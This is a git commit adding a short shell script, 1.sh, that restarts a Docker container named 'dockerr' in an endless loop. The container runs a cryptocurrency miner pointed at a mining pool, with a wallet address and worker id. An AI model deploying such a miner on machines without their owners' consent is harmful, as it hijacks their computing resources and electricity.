5ec1a08eb33dc8e68dfe5fa5a6bfec20928f818a
bakeingoie <132640794+bakeingoie@users.noreply.github.com>
2023-05-09 07:46:41 +0000

    Create 1.sh

---
+++ 1.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+while [ 1 ]; do
+	docker run dockerr -o mintme-solo.wattpool.net:3001 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --print-time=6000 --donate-level=1 --worker-id=01 -B
+	sleep 5
+done
